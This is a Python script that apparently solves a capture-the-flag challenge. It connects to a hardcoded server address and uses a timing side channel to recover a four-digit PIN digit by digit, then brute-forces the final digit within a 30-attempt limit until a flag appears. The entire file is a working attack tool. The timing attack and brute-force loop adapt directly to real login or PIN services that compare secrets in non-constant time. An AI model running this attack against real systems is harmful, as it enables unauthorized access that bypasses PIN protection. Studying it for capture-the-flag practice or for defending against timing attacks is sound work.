import socket
import time

HOST = "178.128.228.135"
PORT = 20001

def solve():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(15)  # Generous timeout for later positions
        s.connect((HOST, PORT))

        time.sleep(2)
        banner = s.recv(4096).decode()
        print(f"[*] Banner: {banner.strip()}")

        attempts = 0

        def try_pin(pin_str):
            nonlocal attempts
            s.sendall((pin_str + "\n").encode())
            start = time.perf_counter()
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    text = data.decode(errors='replace')
                    if "Please enter" in text or "LGR{" in text or "lgr{" in text:
                        break
                except socket.timeout:
                    break
            elapsed = time.perf_counter() - start
            resp = data.decode(errors='replace')
            attempts += 1
            return elapsed, resp

        pin = ""

        # Discover first 3 digits via timing (7 × 3 = 21 attempts)
        for pos in range(3):
            print(f"\n[!] Position {pos+1} (used {attempts}/30)")
            timings = {}

            for digit in "0123456":
                guess = (pin + digit).ljust(4, "0")[:4]
                elapsed, resp = try_pin(guess)

                if "LGR{" in resp or "lgr{" in resp:
                    print(f"\n[🎊 FLAG] {resp.strip()}")
                    return

                timings[digit] = elapsed
                short = resp.replace('\n', ' ').strip()[:80]
                print(f"  {guess} -> {elapsed:.4f}s | {short}")

            sorted_t = sorted(timings.items(), key=lambda x: x[1], reverse=True)
            best = sorted_t[0]
            second = sorted_t[1]
            gap = best[1] - second[1]
            print(f"  Slowest: '{best[0]}' ({best[1]:.4f}s) gap: {gap:.4f}s")

            if gap > 0.05:
                pin += best[0]
            else:
                pin += "9"
                print(f"  No clear winner — defaulting to '9'")

            print(f"[+] PIN so far: {pin}")

        # Position 4: DON'T time — just try all 10 digits as final PINs
        # 21 used, 9 remaining — enough to try 0-8 (and if none works, it's 9)
        print(f"\n[*] PIN prefix: {pin}. Trying all final digits... ({attempts}/30)")

        for digit in "0123456789":
            if attempts >= 30:
                break
            final = pin + digit
            print(f"  Submitting: {final}...", end=" ")
            elapsed, resp = try_pin(final)
            print(f"{elapsed:.4f}s | {resp.replace(chr(10), ' ').strip()[:80]}")

            if "LGR{" in resp or "lgr{" in resp:
                print(f"\n[🎊 FLAG] {resp.strip()}")
                return

        print(f"\n[!] Failed. Used {attempts}/30")

solve()